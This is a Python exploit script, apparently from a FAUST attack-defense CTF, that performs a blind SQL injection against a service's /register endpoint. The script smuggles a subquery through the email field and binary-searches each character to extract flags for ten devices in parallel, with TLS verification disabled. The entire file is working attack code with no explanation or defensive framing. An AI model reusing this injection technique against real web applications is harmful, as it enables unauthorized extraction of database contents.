import sys, requests, string
from random import sample
from multiprocessing import Pool

ip = '10.60.30.100'
if len(sys.argv) > 1:
    ip = sys.argv[1]


def sploit(device):
    found = "FAUST_"
    s = requests.session()
    for i in range(len(found), 38):
        vals = "".join(sorted(string.ascii_letters + string.digits + '+/_'))
        while len(vals) > 1:
            idx = len(found) + 1
            check_idx = (len(vals) - 1) // 2
            cur = vals[check_idx]
            id = "".join(sample(string.ascii_letters, 30))
            print("\x1b[2K\rdevice {:2} checking {}".format(device, repr(found + cur)), end="")

            subquery = "(SELECT crypt('a', gen_salt('bf')) FROM owners WHERE device_id = " + str(device) + " AND substring(reason from " + str(len(found) + 1) + " for 1) <= '" + cur + "')"

            resp = s.post("https://{}:2443/register".format(ip), verify=False,
                                 data={
                                     "email": id + "exploit@faust.ninja', " + subquery + "); -- exploit@faust.ninja",
                                     "password": "a",
                                     "password_confirm": "a",
                                 })
            if resp.ok:
                vals = vals[:check_idx + 1]
            else:
                vals = vals[check_idx + 1:]
        found += vals[0]
    print("\x1b[2K\rfound '{}' for device {}".format(found, device))

with Pool(10) as p:
    p.map(sploit, range(1, 11))
